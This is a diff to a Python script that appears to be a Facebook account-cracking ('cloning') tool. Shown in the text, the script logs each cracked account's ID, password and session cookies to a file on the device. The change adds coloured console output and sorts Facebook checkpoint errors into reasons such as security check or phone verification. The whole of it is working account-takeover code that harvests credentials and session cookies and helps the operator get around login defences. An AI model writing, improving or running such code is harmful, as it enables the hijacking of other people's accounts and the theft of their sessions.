@@ -455,14 +455,30 @@ def login1(uid):
                 cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                 oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\n{uid}|{pw}|{cookies}')
+                print(f'\033[38;5;46m{uid}|{pw}|{cookies}\033[1;97m')
                 break
 
             elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                 cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                 cps.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\n{uid}|{pw}|{cookies}')
+                
+                # Check CP reason
+                error_msg = rp.get('error', {}).get('message', '').lower()
+                if "security" in error_msg:
+                    cp_reason = "SECURITY-CHECK"
+                elif "verify" in error_msg or "verification" in error_msg:
+                    cp_reason = "PHONE-VERIFICATION"
+                elif "suspicious" in error_msg:
+                    cp_reason = "SUSPICIOUS-ACTIVITY"
+                elif "blocked" in error_msg:
+                    cp_reason = "TEMPORARILY-BLOCKED"
+                elif "confirm" in error_msg:
+                    cp_reason = "IDENTITY-CONFIRM"
+                else:
+                    cp_reason = "GENERAL-CHECKPOINT"
+                
+                print(f'\033[38;5;196m{uid}|{pw}|{cookies}|CP-REASON:{cp_reason}\033[1;97m')
                 break
 
             else:
